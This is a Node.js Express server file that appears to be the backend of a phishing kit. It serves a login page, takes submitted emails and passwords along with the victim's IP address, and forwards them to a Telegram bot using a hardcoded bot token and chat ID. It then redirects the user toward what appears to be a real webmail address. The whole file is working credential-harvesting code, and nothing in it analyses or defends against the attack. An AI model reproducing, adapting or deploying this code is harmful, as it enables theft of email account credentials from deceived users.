const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const requestIp = require("request-ip");

const app = express();
const PORT = 3000;

// 🔹 Replace these with your actual Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = "7946945439:AAGeYhm4yOdyDpr8D3tIVb0qQiZk4q_q0F8";
const TELEGRAM_CHAT_ID = "7207894371";

app.use(cors());
app.use(bodyParser.json());
app.use(requestIp.mw()); // Middleware to get client IP
app.use(express.static(__dirname)); // Serve index.html

// Serve index.html when visiting the root
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// Handle login requests
app.post("/", async (req, res) => {
    const { email, password } = req.body;
    const ip = req.clientIp || "Unknown IP";

    if (!email || !password) {
        return res.redirect("https://mail.nctc.com/");
    }

    const escapeMarkdown = (text) => {
        return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Escape special characters
    };

    const message = escapeMarkdown(`🔴 Login Attempt
👤 Email: ${email}
🛑 Password: ${password}
📍 IP: ${ip}`);

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "MarkdownV2",
        });

        console.log("Sent to Telegram:", message);
        res.json({ redirect: true });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
        res.status(500).json({ error: "Failed to send to Telegram" });
    }
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
